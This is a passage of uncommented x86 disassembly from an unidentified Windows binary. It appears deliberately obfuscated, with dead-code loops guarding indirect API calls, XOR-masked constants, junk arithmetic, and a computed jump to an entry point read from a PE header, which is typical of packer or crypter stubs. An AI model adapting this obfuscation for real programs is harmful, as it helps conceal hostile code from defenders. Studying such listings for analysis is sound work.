  401fea:	cmp    DWORD PTR ds:0x42c018,0x26
  401ff1:	jne    0x40200a
  401ff7:	push   0x887e
  401ffc:	push   0x81aa
  402001:	push   DWORD PTR [ebp-0x1c]
  402004:	call   DWORD PTR ds:0x42ed41
  40200a:	mov    ebx,DWORD PTR ds:0x42c018
  402010:	dec    ebx
  402011:	mov    DWORD PTR ds:0x42c018,ebx
  402017:	jmp    0x401fdd
  40201c:	and    DWORD PTR ds:0x42a018,0x0
  402026:	mov    ebx,DWORD PTR ds:0x42a018
  40202c:	inc    ebx
  40202d:	mov    DWORD PTR ds:0x42a018,ebx
  402033:	cmp    DWORD PTR ds:0x42a018,0x27
  40203a:	jne    0x402051
  402040:	push   DWORD PTR [ebp-0x10]
  402043:	push   0x429008
  402048:	push   DWORD PTR [ebp-0xc]
  40204b:	call   DWORD PTR ds:0x42ed45
  402051:	cmp    DWORD PTR ds:0x42a018,0x17
  402058:	jb     0x402026
  40205e:	xor    ebx,0x6fac
  402064:	xor    eax,esi
  402066:	add    eax,edi
  402068:	mov    ds:0x42ebcd,eax
  40206d:	sub    ebx,ebx
  40206f:	mov    eax,ds:0x42e435
  402074:	mov    eax,DWORD PTR [eax+0x18c]
  40207a:	sbb    DWORD PTR ds:0x42c004,ecx
  402080:	mov    eax,DWORD PTR [eax]
  402082:	mov    DWORD PTR [ebp-0x68],eax
  402085:	or     DWORD PTR ds:0x42900c,0x1063
  40208f:	mov    ebx,0xf89c85b1
  402094:	mov    DWORD PTR [ebp-0x10],ebx
  402097:	dec    DWORD PTR ds:0x429024
  40209d:	mov    DWORD PTR [ebp-0x10],ebx
  4020a0:	sub    DWORD PTR ds:0x429028,0x6632
  4020aa:	mov    DWORD PTR [ebp-0x10],ebx
  4020ad:	and    DWORD PTR ds:0x42b018,0x42a00c
  4020b7:	mov    DWORD PTR [ebp-0x1c],ecx
  4020ba:	mov    DWORD PTR [ebp-0x10],ebx
  4020bd:	add    DWORD PTR ds:0x42a008,0x61a5
  4020c7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4020ce:	adc    DWORD PTR ds:0x42a004,0x6791
  4020d8:	mov    eax,DWORD PTR [ebp-0x8]
  4020db:	and    DWORD PTR ds:0x42d008,0x429018
  4020e5:	xor    eax,esi
  4020e7:	add    eax,edi
  4020e9:	mov    DWORD PTR ds:0x42c00c,0x48a6
  4020f3:	jmp    0x4022be
  4020f8:	add    eax,eax
  4020fa:	mov    eax,DWORD PTR [ebp-0xc]
  4020fd:	adc    DWORD PTR ds:0x42c000,0x10b0
  402107:	mov    ecx,DWORD PTR [ebp-0x18]
  40210a:	xor    eax,esi
  40210c:	sub    DWORD PTR ds:0x42b00c,0x42a004
  402116:	lea    eax,[eax+ecx*1+0x3272dd]
  40211d:	push   eax
  40211e:	mov    DWORD PTR ds:0x42a014,0x1b
  402128:	cmp    DWORD PTR ds:0x42a014,0x0
  40212f:	je     0x40217e
  402135:	cmp    DWORD PTR ds:0x42a014,0x6
  40213c:	jne    0x402148
  402142:	call   DWORD PTR ds:0x42ed51
  402148:	cmp    DWORD PTR ds:0x42a014,0x7
  40214f:	jne    0x402160
  402155:	mov    eax,ds:0x42a014
  40215a:	dec    eax
  40215b:	mov    ds:0x42a014,eax
  402160:	mov    eax,ds:0x42a014
  402165:	dec    eax
  402166:	mov    ds:0x42a014,eax
  40216b:	jmp    0x402128
  402170:	xor    eax,eax
  402172:	add    eax,DWORD PTR ds:0x42a008
  402178:	sub    DWORD PTR ds:0x429024,eax
  40217e:	mov    eax,DWORD PTR [ebp-0x1c]
  402181:	adc    DWORD PTR ds:0x429020,0x429028
  40218b:	xor    eax,esi
  40218d:	lea    eax,[ebp+eax*1+0x3272e5]
  402194:	push   eax
  402195:	add    DWORD PTR ds:0x42900c,0x1bda
  40219f:	mov    eax,ds:0x42e435
  4021a4:	push   DWORD PTR [eax+0x1bc]
  4021aa:	xor    DWORD PTR ds:0x42c018,0x429018
  4021b4:	call   0x4029b7
  4021b9:	and    DWORD PTR ds:0x42b018,0x0
  4021c3:	jmp    0x4021d5
  4021c8:	mov    ecx,DWORD PTR ds:0x42b018
  4021ce:	inc    ecx
  4021cf:	mov    DWORD PTR ds:0x42b018,ecx
  4021d5:	cmp    DWORD PTR ds:0x42b018,0x1d
  4021dc:	jae    0x4021fa
  4021e2:	cmp    DWORD PTR ds:0x42b018,0x27
  4021e9:	jne    0x4021f5
  4021ef:	call   DWORD PTR ds:0x42ed55
  4021f5:	jmp    0x4021c8
  4021fa:	mov    eax,DWORD PTR [ebp-0xc]
  4021fd:	mov    ecx,DWORD PTR [ebp-0x18]
  402200:	and    DWORD PTR ds:0x429010,0x0
  40220a:	mov    edx,DWORD PTR ds:0x429010
  402210:	inc    edx
  402211:	mov    DWORD PTR ds:0x429010,edx
  402217:	cmp    DWORD PTR ds:0x429010,0x9
  40221e:	jne    0x402245
  402224:	push   DWORD PTR [ebp-0x20]
  402227:	push   DWORD PTR [ebp-0x14]
  40222a:	push   0x42a010
  40222f:	push   0x39f6
  402234:	push   DWORD PTR [ebp-0x10]
  402237:	push   0x1415
  40223c:	push   DWORD PTR [ebp-0x14]
  40223f:	call   DWORD PTR ds:0x42ed59
  402245:	cmp    DWORD PTR ds:0x429010,0x8
  40224c:	jne    0x40225f
  402252:	mov    edx,DWORD PTR ds:0x429010
  402258:	inc    edx
  402259:	mov    DWORD PTR ds:0x429010,edx
  40225f:	cmp    DWORD PTR ds:0x429010,0x17
  402266:	jb     0x40220a
  40226c:	and    DWORD PTR ds:0x42d01c,0x0
  402276:	jmp    0x402288
  40227b:	mov    edx,DWORD PTR ds:0x42d01c
  402281:	inc    edx
  402282:	mov    DWORD PTR ds:0x42d01c,edx
  402288:	cmp    DWORD PTR ds:0x42d01c,0x16
  40228f:	jae    0x4022b5
  402295:	cmp    DWORD PTR ds:0x42d01c,0x1f
  40229c:	jne    0x4022b0
  4022a2:	push   DWORD PTR [ebp-0xc]
  4022a5:	push   0x42e12b
  4022aa:	call   DWORD PTR ds:0x42ed5d
  4022b0:	jmp    0x40227b
  4022b5:	xor    eax,esi
  4022b7:	lea    eax,[ecx+eax*1+0x3272dd]
  4022be:	and    DWORD PTR ds:0x429000,0x0
  4022c8:	jmp    0x4022da
  4022cd:	mov    edx,DWORD PTR ds:0x429000
  4022d3:	inc    edx
  4022d4:	mov    DWORD PTR ds:0x429000,edx
  4022da:	cmp    DWORD PTR ds:0x429000,0x1a
  4022e1:	jae    0x402370
  4022e7:	cmp    DWORD PTR ds:0x429000,0x7
  4022ee:	jne    0x402308
  4022f4:	push   0x42e196
  4022f9:	push   0x1
  4022fb:	push   0x0
  4022fd:	push   0x72dd
  402302:	call   DWORD PTR ds:0x42ed61
  402308:	cmp    DWORD PTR ds:0x429000,0x6
  40230f:	jne    0x402322
  402315:	mov    edx,DWORD PTR ds:0x429000
  40231b:	inc    edx
  40231c:	mov    DWORD PTR ds:0x429000,edx
  402322:	jmp    0x4022cd
  402327:	and    DWORD PTR ds:0x42a014,0x0
  402331:	mov    edx,DWORD PTR ds:0x42a014
  402337:	inc    edx
  402338:	mov    DWORD PTR ds:0x42a014,edx
  40233e:	cmp    DWORD PTR ds:0x42a014,0x1b
  402345:	jne    0x402359
  40234b:	push   0x42d004
  402350:	push   DWORD PTR [ebp-0x18]
  402353:	call   DWORD PTR ds:0x42ed65
  402359:	cmp    DWORD PTR ds:0x42a014,0x11
  402360:	jb     0x402331
  402366:	and    DWORD PTR ds:0x42d018,0x567b
  402370:	mov    ecx,DWORD PTR [ebp-0xc]
  402373:	xor    edx,0x27b9
  402379:	mov    edx,DWORD PTR [ebp-0xc]
  40237c:	add    DWORD PTR ds:0x42a010,0x42d014
  402386:	xor    edx,esi
  402388:	xor    ecx,esi
  40238a:	and    DWORD PTR ds:0x42c00c,0x48dd
  402394:	add    ecx,edx
  402396:	mov    edx,DWORD PTR [ebp-0xc]
  402399:	neg    DWORD PTR ds:0x42c00c
  40239f:	xor    edx,esi
  4023a1:	lea    ecx,[ecx+edx*1+0x975897]
  4023a8:	mov    DWORD PTR ds:0x42b018,0x21
  4023b2:	mov    DWORD PTR [ebp-0x18],eax
  4023b5:	mov    DWORD PTR ds:0x42a010,0x55c5
  4023bf:	cmp    eax,ecx
  4023c1:	mov    DWORD PTR ds:0x42c01c,0x1ffa
  4023cb:	jbe    0x4020f8
  4023d1:	mov    eax,DWORD PTR [ebp+0xc]
  4023d4:	mov    ds:0x42e2b9,eax
  4023d9:	mov    eax,DWORD PTR [ebp+0x10]
  4023dc:	mov    ds:0x42e50d,eax
  4023e1:	mov    eax,ds:0x42e2b9
  4023e6:	mov    ecx,DWORD PTR [ebp-0x28]
  4023e9:	sub    eax,edi
  4023eb:	xor    eax,esi
  4023ed:	mov    DWORD PTR [ecx],eax
  4023ef:	mov    eax,DWORD PTR [ebp-0x24]
  4023f2:	cmp    eax,0xf89c85b5
  4023f7:	jne    0x4024d1
  4023fd:	lea    eax,[ebp-0x38]
  402400:	mov    DWORD PTR [ebp-0x70],eax
  402403:	lea    eax,[ebp+0x4]
  402406:	mov    DWORD PTR [ebp-0x38],eax
  402409:	mov    eax,DWORD PTR [ebp-0x38]
  40240c:	test   eax,eax
  40240e:	je     0x402987
  402414:	mov    eax,DWORD PTR [ebp-0x20]
  402417:	mov    eax,DWORD PTR [ebp-0xc]
  40241a:	mov    eax,DWORD PTR [ebp-0x8]
  40241d:	mov    DWORD PTR [ebp+0xc],eax
  402420:	mov    eax,eax
  402422:	mov    eax,ds:0x42e435
  402427:	mov    eax,DWORD PTR [eax+0x1c8]
  40242d:	mov    eax,DWORD PTR [eax]
  40242f:	cdq    
  402430:	mov    ebx,eax
  402432:	mov    eax,0xfabdbeed
  402437:	add    ebx,eax
  402439:	adc    edx,0xffffffff
  40243c:	and    DWORD PTR [ebp-0x10],0x0
  402440:	xor    edx,0x0
  402443:	mov    DWORD PTR [ebp-0x54],edx
  402446:	mov    edx,DWORD PTR [ebp+0xc]
  402449:	mov    DWORD PTR [ebp-0x14],edx
  40244c:	mov    ecx,0x8a29a127
  402451:	xor    ebx,ecx
  402453:	add    DWORD PTR [ebp-0x14],eax
  402456:	mov    edx,DWORD PTR [ebp-0x14]
  402459:	adc    DWORD PTR [ebp-0x10],0xffffffff
  40245d:	xor    edx,ecx
  40245f:	mov    DWORD PTR [ebp-0x4c],edx
  402462:	mov    edx,DWORD PTR [ebp-0x10]
  402465:	xor    edx,0x0
  402468:	mov    DWORD PTR [ebp-0x48],edx
  40246b:	cmp    DWORD PTR [ebp-0x4c],ebx
  40246e:	jne    0x402480
  402474:	mov    edx,DWORD PTR [ebp-0x54]
  402477:	cmp    DWORD PTR [ebp-0x48],edx
  40247a:	je     0x4024af
  402480:	mov    edx,DWORD PTR ds:0x42e435
  402486:	mov    edx,DWORD PTR [edx+0x1c0]
  40248c:	mov    edx,DWORD PTR [edx]
  40248e:	xor    ebx,ebx
  402490:	add    edx,eax
  402492:	adc    ebx,0xffffffff
  402495:	xor    edx,ecx
  402497:	xor    ebx,0x0
  40249a:	cmp    edx,0x70941fc9
  4024a0:	jne    0x402987
  4024a6:	cmp    ebx,0xffffffff
  4024a9:	jne    0x402987
  4024af:	mov    edx,DWORD PTR ds:0x42e4b1
  4024b5:	mov    ebx,DWORD PTR ds:0x42e4b9
  4024bb:	xor    edx,ebx
  4024bd:	mov    DWORD PTR ds:0x42e4b1,edx
  4024c3:	mov    ebx,DWORD PTR ds:0x42e4b1
  4024c9:	mov    edx,DWORD PTR [ebp-0x38]
  4024cc:	jmp    0x402946
  4024d1:	mov    eax,DWORD PTR [ebp-0x34]
  4024d4:	cmp    eax,0xf89c85b2
  4024d9:	je     0x402536
  4024df:	mov    eax,DWORD PTR [ebp-0x8]
  4024e2:	mov    ecx,DWORD PTR [ebp-0x30]
  4024e5:	xor    eax,esi
  4024e7:	add    eax,edi
  4024e9:	cmp    eax,ecx
  4024eb:	je     0x402536
  4024f1:	mov    eax,ds:0x42e435
  4024f6:	mov    eax,DWORD PTR [eax+0x194]
  4024fc:	mov    ecx,DWORD PTR [eax]
  4024fe:	mov    eax,DWORD PTR [ecx+0x3c]
  402501:	push   DWORD PTR ds:0x42e50d
  402507:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40250b:	push   DWORD PTR ds:0x42e2b9
  402511:	add    eax,ecx
  402513:	mov    ecx,DWORD PTR ds:0x42e435
  402519:	mov    ecx,DWORD PTR [ecx+0x194]
  40251f:	push   DWORD PTR [ecx]
  402521:	call   eax
  402523:	mov    ecx,DWORD PTR ds:0x42e435
  402529:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40252f:	mov    DWORD PTR [ecx],eax
  402531:	jmp    0x402987
  402536:	mov    eax,DWORD PTR [ebp-0x8]
  402539:	mov    ecx,DWORD PTR [ebp-0x68]
  40253c:	xor    eax,esi
  40253e:	add    eax,edi
  402540:	cmp    eax,ecx
  402542:	jne    0x402850
  402548:	mov    eax,DWORD PTR [ebp-0x8]
  40254b:	mov    ecx,DWORD PTR ds:0x42e435
  402551:	mov    ecx,DWORD PTR [ecx+0x198]
  402557:	xor    eax,esi
  402559:	add    eax,edi
  40255b:	cmp    eax,DWORD PTR [ecx]
  40255d:	jne    0x40257c
  402563:	mov    eax,DWORD PTR [ebp-0x8]
  402566:	push   0xf89c85b5
  40256b:	xor    eax,esi
  40256d:	add    eax,edi
  40256f:	push   eax
  402570:	push   ebx
  402571:	push   DWORD PTR [ebp-0xc]
  402574:	push   DWORD PTR [ebp-0x8]
  402577:	call   0x40a327
  40257c:	mov    eax,DWORD PTR [ebp-0xc]
  40257f:	mov    DWORD PTR [ebp-0x3c],eax
  402582:	mov    eax,DWORD PTR [ebp-0x8]
  402585:	mov    DWORD PTR [ebp-0x18],eax
  402588:	mov    eax,DWORD PTR [ebp-0x18]
  40258b:	xor    eax,esi
  40258d:	add    eax,edi
  40258f:	mov    DWORD PTR [ebp+0x10],eax
  402592:	mov    eax,ds:0x42e2b5
  402597:	mov    eax,DWORD PTR [eax]
  402599:	mov    DWORD PTR [ebp+0x10],eax
  40259c:	mov    eax,ds:0x42e4bd
  4025a1:	mov    eax,DWORD PTR [eax]
  4025a3:	mov    DWORD PTR [ebp-0x1c],eax
  4025a6:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  4025ad:	mov    eax,DWORD PTR [ebp+0xc]
  4025b0:	xor    eax,esi
  4025b2:	add    eax,edi
  4025b4:	mov    DWORD PTR [ebp+0xc],eax
  4025b7:	mov    eax,ds:0x42e435
  4025bc:	mov    DWORD PTR [ebp+0xc],eax
  4025bf:	mov    eax,DWORD PTR [ebp+0x10]
  4025c2:	mov    DWORD PTR [ebp+0xc],eax
  4025c5:	mov    eax,DWORD PTR [ebp+0xc]
  4025c8:	push   0x4
  4025ca:	pop    ecx
  4025cb:	sub    ecx,eax
  4025cd:	add    ecx,DWORD PTR [ebp-0x1c]
  4025d0:	mov    DWORD PTR [ebp-0x28],0xf89c85f5
  4025d7:	mov    DWORD PTR [ebp+0x10],ecx
  4025da:	mov    DWORD PTR [ebp-0xcc],ebx
  4025e0:	mov    eax,DWORD PTR [ebp+0xc]
  4025e3:	mov    DWORD PTR [ebp-0xc8],eax
  4025e9:	mov    eax,DWORD PTR [ebp+0x10]
  4025ec:	mov    DWORD PTR [ebp-0xc4],eax
  4025f2:	mov    eax,DWORD PTR [ebp-0x28]
  4025f5:	xor    eax,esi
  4025f7:	add    eax,edi
  4025f9:	mov    DWORD PTR [ebp-0xc0],eax
  4025ff:	lea    eax,[ebp-0x78]
  402602:	mov    DWORD PTR [ebp-0xbc],eax
  402608:	mov    eax,DWORD PTR [ebp-0xcc]
  40260e:	xor    eax,esi
  402610:	add    eax,edi
  402612:	mov    DWORD PTR [ebp-0xcc],eax
  402618:	lea    eax,[ebp-0xcc]
  40261e:	push   eax
  40261f:	mov    eax,DWORD PTR [ebp-0x3c]
  402622:	xor    eax,esi
  402624:	add    eax,edi
  402626:	push   eax
  402627:	mov    eax,ds:0x42e455
  40262c:	push   0x42e3ab
  402631:	push   DWORD PTR [eax]
  402633:	call   0x40508b
  402638:	mov    eax,DWORD PTR [ebp+0xc]
  40263b:	mov    ecx,DWORD PTR [ebp+0x10]
  40263e:	mov    DWORD PTR [ebp-0x6c],ecx
  402641:	mov    ecx,DWORD PTR [ebp-0x18]
  402644:	xor    ecx,esi
  402646:	mov    DWORD PTR [ebp-0x1c],eax
  402649:	add    ecx,edi
  40264b:	jmp    0x4027f1
  402650:	lea    edx,[ecx+eax*1]
  402653:	mov    DWORD PTR [ebp+0x10],edx
  402656:	mov    edx,DWORD PTR [ebp-0x6c]
  402659:	sub    edx,ecx
  40265b:	mov    DWORD PTR [ebp+0xc],edx
  40265e:	mov    edx,DWORD PTR [ebp+0xc]
  402661:	mov    DWORD PTR [ebp-0x40],edx
  402664:	mov    edx,DWORD PTR [ebp+0x10]
  402667:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  40266e:	mov    DWORD PTR [ebp-0x64],edx
  402671:	mov    DWORD PTR [ebp+0x10],0xf89c85b2
  402678:	mov    edx,DWORD PTR [ebp-0x44]
  40267b:	xor    edx,esi
  40267d:	add    edx,edi
  40267f:	mov    DWORD PTR [ebp+0xc],edx
  402682:	mov    edx,DWORD PTR [ebp-0x44]
  402685:	xor    edx,esi
  402687:	add    edx,edi
  402689:	mov    DWORD PTR [ebp-0x4],edx
  40268c:	mov    DWORD PTR [ebp-0x60],0xf89c85d5
  402693:	mov    DWORD PTR [ebp-0x5c],0xf89c85bc
  40269a:	mov    edx,DWORD PTR [ebp-0x44]
  40269d:	mov    ebx,DWORD PTR [ebp-0x40]
  4026a0:	xor    edx,esi
  4026a2:	add    edx,edi
  4026a4:	cmp    ebx,edx
  4026a6:	je     0x4027e5
  4026ac:	mov    eax,DWORD PTR [ebp+0x10]
  4026af:	xor    eax,esi
  4026b1:	mov    edx,0xffcd8d23
  4026b6:	sub    edx,eax
  4026b8:	add    edx,DWORD PTR [ebp-0x40]
  4026bb:	mov    eax,DWORD PTR [ebp+0x10]
  4026be:	mov    ebx,DWORD PTR [ebp+0xc]
  4026c1:	xor    eax,esi
  4026c3:	add    eax,edi
  4026c5:	imul   eax,ebx
  4026c8:	cmp    eax,edx
  4026ca:	ja     0x4027e2
  4026d0:	mov    edx,DWORD PTR [ebp+0xc]
  4026d3:	mov    eax,DWORD PTR [ebp-0x40]
  4026d6:	mov    ebx,DWORD PTR [ebp-0x60]
  4026d9:	sub    eax,edx
  4026db:	xor    ebx,esi
  4026dd:	xor    edx,edx
  4026df:	add    ebx,edi
  4026e1:	div    ebx
  4026e3:	mov    DWORD PTR [ebp-0x4],eax
  4026e6:	mov    eax,DWORD PTR [ebp-0x5c]
  4026e9:	mov    edx,DWORD PTR [ebp-0x4]
  4026ec:	xor    eax,esi
  4026ee:	add    eax,edi
  4026f0:	cmp    edx,eax
  4026f2:	jbe    0x402702
  4026f8:	mov    eax,DWORD PTR [ebp-0x5c]
  4026fb:	xor    eax,esi
  4026fd:	add    eax,edi
  4026ff:	mov    DWORD PTR [ebp-0x4],eax
  402702:	mov    eax,DWORD PTR [ebp-0x60]
  402705:	mov    edx,DWORD PTR [ebp-0x4]
  402708:	xor    eax,esi
  40270a:	add    eax,edi
  40270c:	imul   eax,edx
  40270f:	mov    DWORD PTR [ebp-0x4],eax
  402712:	mov    eax,DWORD PTR [ebp-0x44]
  402715:	mov    edx,DWORD PTR [ebp-0x4]
  402718:	xor    eax,esi
  40271a:	add    eax,edi
  40271c:	cmp    edx,eax
  40271e:	je     0x4027cb
  402724:	mov    eax,DWORD PTR [ebp-0x4]
  402727:	mov    DWORD PTR [ebp-0x24],eax
  40272a:	mov    eax,DWORD PTR [ebp+0xc]
  40272d:	add    eax,DWORD PTR [ebp-0x64]
  402730:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  402737:	mov    DWORD PTR [ebp-0x48],eax
  40273a:	mov    eax,0xf89c85b2
  40273f:	mov    DWORD PTR [ebp-0x50],eax
  402742:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  402749:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  402750:	mov    DWORD PTR [ebp-0x54],eax
  402753:	mov    eax,DWORD PTR [ebp-0x28]
  402756:	xor    eax,esi
  402758:	add    eax,edi
  40275a:	jmp    0x402787
  40275f:	mov    eax,DWORD PTR [ebp-0x54]
  402762:	mov    edx,DWORD PTR [ebp-0x4]
  402765:	xor    eax,esi
  402767:	add    eax,edi
  402769:	imul   eax,edx
  40276c:	mov    edx,DWORD PTR [ebp-0x48]
  40276f:	mov    BYTE PTR [eax+edx*1],0x0
  402773:	mov    eax,DWORD PTR [ebp-0x10]
  402776:	mov    edx,DWORD PTR [ebp-0x50]
  402779:	xor    eax,esi
  40277b:	xor    edx,esi
  40277d:	add    eax,edi
  40277f:	add    edx,edi
  402781:	imul   eax,edx
  402784:	add    eax,DWORD PTR [ebp-0x4]
  402787:	mov    DWORD PTR [ebp-0x4],eax
  40278a:	mov    eax,DWORD PTR [ebp-0x4]
  40278d:	mov    edx,DWORD PTR [ebp-0x24]
  402790:	cmp    edx,eax
  402792:	jb     0x40275f
  402798:	mov    eax,DWORD PTR [ebp-0x50]
  40279b:	mov    edx,DWORD PTR [ebp-0x24]
  40279e:	xor    eax,esi
  4027a0:	add    eax,edi
  4027a2:	imul   eax,edx
  4027a5:	mov    edx,DWORD PTR [ebp-0x28]
  4027a8:	xor    edx,esi
  4027aa:	add    edx,edi
  4027ac:	or     eax,edx
  4027ae:	mov    edx,DWORD PTR [ebp+0x10]
  4027b1:	xor    edx,esi
  4027b3:	add    eax,edx
  4027b5:	mov    edx,DWORD PTR [ebp+0x10]
  4027b8:	xor    edx,esi
  4027ba:	add    eax,edx
  4027bc:	mov    edx,DWORD PTR [ebp+0xc]
  4027bf:	lea    eax,[eax+edx*1+0x64e5ba]
  4027c6:	jmp    0x4027da
  4027cb:	mov    eax,DWORD PTR [ebp+0x10]
  4027ce:	mov    edx,DWORD PTR [ebp+0xc]
  4027d1:	xor    eax,esi
  4027d3:	lea    eax,[eax+edx*1+0x3272dd]
  4027da:	mov    DWORD PTR [ebp+0xc],eax
  4027dd:	jmp    0x4026ac
  4027e2:	mov    eax,DWORD PTR [ebp-0x1c]
  4027e5:	mov    edx,DWORD PTR [ebp-0x3c]
  4027e8:	xor    edx,esi
  4027ea:	lea    ecx,[ecx+edx*1+0x3272dd]
  4027f1:	lea    edx,[ecx-0x3272dd]
  4027f7:	xor    edx,esi
  4027f9:	cmp    edx,0xf89c95b5
  4027ff:	jne    0x402650
  402805:	mov    ecx,DWORD PTR [ebp-0x18]
  402808:	mov    edx,DWORD PTR [ebp-0x3c]
  40280b:	mov    ebx,DWORD PTR [ebp-0x18]
  40280e:	xor    edx,esi
  402810:	mov    dl,BYTE PTR [edx+eax*1+0x3272dd]
  402817:	xor    ecx,esi
  402819:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dd]
  402820:	xor    ebx,esi
  402822:	mov    BYTE PTR [ebx+eax*1+0x3272dd],dl
  402829:	mov    edx,DWORD PTR [ebp-0x3c]
  40282c:	xor    edx,esi
  40282e:	mov    BYTE PTR [edx+eax*1+0x3272dd],cl
  402835:	mov    eax,DWORD PTR [ebp-0x3c]
  402838:	mov    eax,DWORD PTR [ebp-0x8]
  40283b:	xor    eax,esi
  40283d:	add    eax,edi
  40283f:	mov    ds:0x42e4b9,eax
  402844:	mov    eax,DWORD PTR [ebp-0x8]
  402847:	xor    eax,esi
  402849:	add    eax,edi
  40284b:	mov    ds:0x42e4b1,eax
  402850:	lea    eax,[ebp-0x2c]
  402853:	mov    DWORD PTR [ebp-0x88],eax
  402859:	lea    eax,[ebp+0x4]
  40285c:	mov    DWORD PTR [ebp-0x2c],eax
  40285f:	mov    eax,DWORD PTR [ebp-0x2c]
  402862:	test   eax,eax
  402864:	je     0x402987
  40286a:	mov    DWORD PTR [ebp-0x80],0xf152c3a
  402871:	mov    DWORD PTR [ebp-0x74],0x712ed0f
  402878:	mov    DWORD PTR [ebp-0x7c],0x373fc2d
  40287f:	mov    DWORD PTR [ebp-0x84],0x72670a1d
  402889:	call   0x409f81
  40288e:	mov    eax,DWORD PTR [ebp-0x20]
  402891:	mov    eax,DWORD PTR [ebp-0xc]
  402894:	mov    eax,DWORD PTR [ebp-0x8]
  402897:	mov    DWORD PTR [ebp+0xc],eax
  40289a:	mov    eax,eax
  40289c:	mov    eax,ds:0x42e435
  4028a1:	mov    eax,DWORD PTR [eax+0x1c8]
  4028a7:	mov    eax,DWORD PTR [eax]
  4028a9:	cdq    
  4028aa:	mov    ebx,eax
  4028ac:	mov    eax,0xfabdbeed
  4028b1:	add    ebx,eax
  4028b3:	adc    edx,0xffffffff
  4028b6:	and    DWORD PTR [ebp-0x10],0x0
  4028ba:	xor    edx,0x0
  4028bd:	mov    DWORD PTR [ebp-0x54],edx
  4028c0:	mov    edx,DWORD PTR [ebp+0xc]
  4028c3:	mov    DWORD PTR [ebp-0x14],edx
  4028c6:	mov    ecx,0x8a29a127
  4028cb:	xor    ebx,ecx
  4028cd:	add    DWORD PTR [ebp-0x14],eax
  4028d0:	mov    edx,DWORD PTR [ebp-0x14]
  4028d3:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4028d7:	xor    edx,ecx
  4028d9:	mov    DWORD PTR [ebp-0x4c],edx
  4028dc:	mov    edx,DWORD PTR [ebp-0x10]
  4028df:	xor    edx,0x0
  4028e2:	mov    DWORD PTR [ebp-0x48],edx
  4028e5:	cmp    DWORD PTR [ebp-0x4c],ebx
  4028e8:	jne    0x4028fa
  4028ee:	mov    edx,DWORD PTR [ebp-0x54]
  4028f1:	cmp    DWORD PTR [ebp-0x48],edx
  4028f4:	je     0x402929
  4028fa:	mov    edx,DWORD PTR ds:0x42e435
  402900:	mov    edx,DWORD PTR [edx+0x1c0]
  402906:	mov    edx,DWORD PTR [edx]
  402908:	xor    ebx,ebx
  40290a:	add    edx,eax
  40290c:	adc    ebx,0xffffffff
  40290f:	xor    edx,ecx
  402911:	xor    ebx,0x0
  402914:	cmp    edx,0x70941fc9
  40291a:	jne    0x402987
  402920:	cmp    ebx,0xffffffff
  402923:	jne    0x402987
  402929:	mov    edx,DWORD PTR ds:0x42e4b1
  40292f:	mov    ebx,DWORD PTR ds:0x42e4b9
  402935:	xor    edx,ebx
  402937:	mov    DWORD PTR ds:0x42e4b1,edx
  40293d:	mov    ebx,DWORD PTR ds:0x42e4b1
  402943:	mov    edx,DWORD PTR [ebp-0x2c]
  402946:	add    DWORD PTR [edx],ebx
  402948:	mov    edx,DWORD PTR [ebp+0xc]
  40294b:	xor    esi,edx
  40294d:	mov    edx,DWORD PTR ds:0x42e4b1
  402953:	add    esi,edi
  402955:	xor    ebx,ebx
  402957:	add    esi,eax
  402959:	adc    ebx,0xffffffff
  40295c:	xor    edi,edi
  40295e:	xor    esi,ecx
  402960:	xor    ebx,0x0
  402963:	add    edx,eax
  402965:	adc    edi,0xffffffff
  402968:	xor    edx,ecx
  40296a:	xor    edi,0x0
  40296d:	cmp    edx,esi
  40296f:	jne    0x402987
  402975:	cmp    edi,ebx
  402977:	jne    0x402987
  40297d:	mov    eax,ds:0x42e4b1
  402982:	mov    ds:0x42e4b9,eax
  402987:	mov    eax,ds:0x42e435
  40298c:	push   0x4
  40298e:	add    eax,0x1cc
  402993:	push   eax
  402994:	lea    eax,[ebp-0x20]
  402997:	push   eax
  402998:	call   0x4029b7
  40299d:	mov    eax,DWORD PTR [ebp-0x20]
  4029a0:	mov    eax,DWORD PTR [eax]
  4029a2:	pop    ebx
  4029a3:	pop    edi
  4029a4:	pop    esi
  4029a5:	leave  
  4029a6:	ret    0xc
  4029a9:	xor    eax,eax
  4029ab:	adc    DWORD PTR ds:0x429018,0x42b01c
  4029b5:	inc    eax
  4029b6:	ret    
  4029b7:	push   ebp
  4029b8:	mov    ebp,esp
  4029ba:	sub    esp,0x10
  4029bd:	mov    eax,0xf89c85b5
  4029c2:	and    DWORD PTR ds:0x42a004,0x0
  4029cc:	jmp    0x4029de
  4029d1:	mov    ecx,DWORD PTR ds:0x42a004
  4029d7:	inc    ecx
  4029d8:	mov    DWORD PTR ds:0x42a004,ecx
  4029de:	cmp    DWORD PTR ds:0x42a004,0x19
  4029e5:	jae    0x402a37
  4029eb:	cmp    DWORD PTR ds:0x42a004,0x8
  4029f2:	jne    0x402a18
  4029f8:	push   0x58e0
  4029fd:	push   0x42d014
  402a02:	push   DWORD PTR [ebp-0x28]
  402a05:	push   0x42e0f3
  402a0a:	push   0x48f7
  402a0f:	push   DWORD PTR [ebp-0x28]
  402a12:	call   DWORD PTR ds:0x42ed6d
  402a18:	cmp    DWORD PTR ds:0x42a004,0x7
  402a1f:	jne    0x402a32
  402a25:	mov    ecx,DWORD PTR ds:0x42a004
  402a2b:	inc    ecx
  402a2c:	mov    DWORD PTR ds:0x42a004,ecx
  402a32:	jmp    0x4029d1
  402a37:	mov    DWORD PTR [ebp-0x4],eax
  402a3a:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  402a41:	movzx  edx,WORD PTR ds:0x42901c
  402a48:	xor    edx,DWORD PTR ds:0x429024
  402a4e:	mov    DWORD PTR ds:0x42901c,edx
  402a54:	mov    ecx,DWORD PTR [ebp-0x4]
  402a57:	sbb    edx,0x1c35
  402a5d:	push   esi
  402a5e:	mov    esi,DWORD PTR ds:0x42c01c
  402a64:	sbb    esi,DWORD PTR ds:0x42d018
  402a6a:	mov    DWORD PTR ds:0x42c01c,esi
  402a70:	mov    edx,0x7510896
  402a75:	mov    esi,DWORD PTR ds:0x42a00c
